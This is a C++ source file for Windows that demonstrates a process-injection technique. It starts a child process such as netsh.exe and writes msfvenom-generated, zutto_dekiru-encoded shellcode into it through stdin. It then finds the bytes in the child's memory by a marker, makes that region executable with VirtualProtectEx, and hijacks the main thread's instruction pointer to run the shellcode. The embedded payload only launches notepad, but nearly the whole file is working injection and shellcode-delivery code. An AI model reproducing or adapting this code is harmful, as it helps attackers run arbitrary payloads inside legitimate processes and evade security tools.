#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#include "PipeExchange.h"
#include "InjectHelp.h"



int main(int argc, char* argv[]) {
    // 1. Ensure a command was passed via command line arguments
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <executable_path>\n";
        std::cout << "Example: " << argv[0] << " C:\\Windows\\System32\\netsh.exe\n";
        return 1;
    }
    //std::string cmdStr = argv[2];
	std::string procName = argv[1];
    // Convert the narrow string command to a wide string (wchar_t) required by CreateProcessW
    int wchars_num = MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, NULL, 0);
    std::vector<wchar_t> childPath(wchars_num);
    MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, childPath.data(), wchars_num);

    std::wcout << L"Launching: " << childPath.data() << L"\n\n";

    HANDLE hChildStd_IN_Rd = NULL;
    HANDLE hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT
    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) {
        std::cerr << "Failed to create STDOUT pipe\n";
        return 1;
    }
    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

    // Create a pipe for the child process's STDIN
    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0)) {
        std::cerr << "Failed to create STDIN pipe\n";
        return 1;
    }
    SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    // 3. Configure the STARTUPINFO structure to redirect standard streams and show window
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hChildStd_OUT_Wr;
    si.hStdOutput = hChildStd_OUT_Wr;
    si.hStdInput = hChildStd_IN_Rd;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW; // Explicitly request the window be shown

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // 4. Launch the process with CREATE_NEW_CONSOLE using arguments from argv
    if (!CreateProcess(NULL, childPath.data(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return 1;
    }

    // 5. CRITICAL: Close the child-side pipe handles in the parent process
    CloseHandle(hChildStd_OUT_Wr);
    CloseHandle(hChildStd_IN_Rd);
    // Give the child process a brief moment to initialize
    Sleep(200);

    //msfvenom -p windows/x64/exec CMD="notepad.exe" -e x64/zutto_dekiru -b '\x0a\x0d\x1a' -f hex
	// bad chars are 0x0a, 0x0d, 0x1a
    //Execute code at offset 0x19
    //Need marker to search from remote memory
     unsigned char rawData[368] = {
        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
        0x6A, 0x48, 0xB8, 0x30, 0xAC, 0x10, 0x28, 0x03, 0xD6, 0x03, 0x02, 0xDB,
        0xCA, 0x54, 0x4D, 0x31, 0xDB, 0x5B, 0x41, 0xB3, 0x23, 0x66, 0x81, 0xE3,
        0x10, 0xF9, 0x48, 0x0F, 0xAE, 0x03, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x8B,
        0x13, 0x49, 0xFF, 0xCB, 0x4A, 0x31, 0x44, 0xDA, 0x27, 0x4D, 0x85, 0xDB,
        0x75, 0xF3, 0xCC, 0xE4, 0x93, 0xCC, 0xF3, 0x3E, 0xC3, 0x02, 0x30, 0xAC,
        0x51, 0x79, 0x42, 0x86, 0x51, 0x53, 0x66, 0xE4, 0x21, 0xFA, 0x66, 0x9E,
        0x88, 0x50, 0x50, 0xE4, 0x9B, 0x7A, 0x1B, 0x9E, 0x88, 0x50, 0x10, 0xE4,
        0x9B, 0x5A, 0x53, 0x9E, 0x0C, 0xB5, 0x7A, 0xE6, 0x5D, 0x19, 0xCA, 0x9E,
        0x32, 0xC2, 0x9C, 0x90, 0x71, 0x54, 0x01, 0xFA, 0x23, 0x43, 0xF1, 0x65,
        0x1D, 0x69, 0x02, 0x17, 0xE1, 0xEF, 0x62, 0xED, 0x41, 0x60, 0x88, 0x84,
        0x23, 0x89, 0x72, 0x90, 0x58, 0x29, 0xD3, 0x5D, 0x83, 0x8A, 0x30, 0xAC,
        0x10, 0x60, 0x86, 0x16, 0x77, 0x65, 0x78, 0xAD, 0xC0, 0x78, 0x88, 0x9E,
        0x1B, 0x46, 0xBB, 0xEC, 0x30, 0x61, 0x02, 0x06, 0xE0, 0x54, 0x78, 0x53,
        0xD9, 0x69, 0x88, 0xE2, 0x8B, 0x4A, 0x31, 0x7A, 0x5D, 0x19, 0xCA, 0x9E,
        0x32, 0xC2, 0x9C, 0xED, 0xD1, 0xE1, 0x0E, 0x97, 0x02, 0xC3, 0x08, 0x4C,
        0x65, 0xD9, 0x4F, 0xD5, 0x4F, 0x26, 0x38, 0xE9, 0x29, 0xF9, 0x76, 0x0E,
        0x5B, 0x46, 0xBB, 0xEC, 0x34, 0x61, 0x02, 0x06, 0x65, 0x43, 0xBB, 0xA0,
        0x58, 0x6C, 0x88, 0x96, 0x1F, 0x4B, 0x31, 0x7C, 0x51, 0xA3, 0x07, 0x5E,
        0x4B, 0x03, 0xE0, 0xED, 0x48, 0x69, 0x5B, 0x88, 0x5A, 0x58, 0x71, 0xF4,
        0x51, 0x71, 0x42, 0x8C, 0x4B, 0x81, 0xDC, 0x8C, 0x51, 0x7A, 0xFC, 0x36,
        0x5B, 0x43, 0x69, 0xF6, 0x58, 0xA3, 0x11, 0x3F, 0x54, 0xFD, 0xCF, 0x53,
        0x4D, 0x60, 0xB9, 0xD7, 0x03, 0x02, 0x30, 0xAC, 0x10, 0x28, 0x03, 0x9E,
        0x8E, 0x8F, 0x31, 0xAD, 0x10, 0x28, 0x42, 0x6C, 0x32, 0x89, 0x5F, 0x2B,
        0xEF, 0xFD, 0xB8, 0x1B, 0x67, 0x9D, 0x58, 0xED, 0xAA, 0x8E, 0x96, 0x6B,
        0x9E, 0xFD, 0xE5, 0xE4, 0x93, 0xEC, 0x2B, 0xEA, 0x05, 0x7E, 0x3A, 0x2C,
        0xEB, 0xC8, 0x76, 0xD3, 0xB8, 0x45, 0x23, 0xDE, 0x7F, 0x42, 0x03, 0x8F,
        0x42, 0x8B, 0xEA, 0x53, 0xC5, 0x46, 0x6C, 0xA2, 0x66, 0x72, 0x51, 0xC8,
        0x3E, 0x4D, 0x7B, 0xB3, 0x03, 0x45, 0x31, 0x32, 0x33, 0x34, 0x34, 0x35,
        0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34
    };


	WriteToPipeBin(hChildStd_IN_Wr, rawData, sizeof(rawData));

    // Give the process time to execute and reply
    Sleep(2000);
    std::cout << "--- Output After Command ---\n" << ReadFromPipe(hChildStd_OUT_Rd) << "\n";

	//this is marker to search remote process memory for, then change protection and hijack RIP to execute
    std::vector<uint8_t> rawDataPattern = {
        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
        0x6A
    };

    auto result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern);
	if (!result) {
		std::cout << "Pattern not found in remote process memory now. Wait and search again\n";
        Sleep(2000);
		result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern);
	}
    if (result) {
        std::cout << "Found at remote address: 0x"
            << std::hex << *result << std::dec << "\n";
        SIZE_T  size = (SIZE_T)sizeof(rawData);
		DWORD   newProtect = (DWORD)PAGE_EXECUTE_READWRITE;
        MEMORY_BASIC_INFORMATION mbi{};
        if (VirtualQueryEx(pi.hProcess, (LPCVOID)*result, &mbi, sizeof(mbi))) 
        {
            std::printf("[+] Region @ %p: base=%p size=0x%zX state=0x%lX protect=0x%lX type=0x%lX\n",
                *result, mbi.BaseAddress, mbi.RegionSize,
                mbi.State, mbi.Protect, mbi.Type);
        }
        else {
            PrintLastError("VirtualQueryEx (continuing anyway)");
        }

        // 2) Read remote memory at address/size.
        std::vector<uint8_t> buf(size);
        SIZE_T got = 0;
        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)*result, buf.data(), size, &got)) {
            PrintLastError("ReadProcessMemory");
            CloseHandle(pi.hProcess); return 1;
        }
        std::printf("[+] Read %zu/%zu bytes from 0x%llX\n\n",
            (size_t)got, (size_t)size, (unsigned long long) * result);

        // 3) Hex dump.
        //std::printf("--- Hex dump @ 0x%llX ---\n", (unsigned long long) * result);
        //HexDump(buf.data(), (size_t)got, (uintptr_t)*result);
        //std::printf("--- End ---\n\n");

        // 4) Change protection on the remote region (needs PROCESS_VM_OPERATION).
        if (newProtect != 0) {
            DWORD oldProt = 0;
            if (!VirtualProtectEx(pi.hProcess, (LPVOID)*result, size, newProtect, &oldProt)) {
                PrintLastError("VirtualProtectEx");
                CloseHandle(pi.hProcess); return 1;
            }
            std::printf("[+] VirtualProtectEx OK: 0x%llX size=%zu  old=0x%lX new=0x%lX\n\n",
                (unsigned long long) * result, (size_t)size, oldProt, newProtect);
        }
        else {
            std::printf("[i] new_protect == 0, skipping VirtualProtectEx and RIP hijack\n");
            CloseHandle(pi.hProcess);
            return 0;
        }

        // 5) Find the main thread of the remote process.
        DWORD mainTid = GetMainThreadId(pi.dwProcessId);
        if (!mainTid) {
            std::printf("[!] Could not find main thread for PID %lu\n", pi.dwProcessId);
            CloseHandle(pi.hProcess); return 1;
        }
        std::printf("[+] Main thread TID = %lu\n", mainTid);

        //Execute code at offset 0x19
        if (!HijackThreadRip(mainTid, ((*result)+0x19), /*resumeAfter=*/true)) {
            std::printf("[!] Failed to hijack thread %lu\n", mainTid);
            CloseHandle(pi.hProcess); return 1;
        }

        std::printf("\n[+] Done. Main thread now executing at 0x%llX\n",
            (unsigned long long)* result);
    }
    else {
        std::cout << "Pattern not found.\n";
    }

    std::cout << "In some put to exit and trigger child thread\n";
	std::cin.get(); // Wait for user input before proceeding
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hChildStd_OUT_Rd);
    CloseHandle(hChildStd_IN_Wr);

    return 0;
}
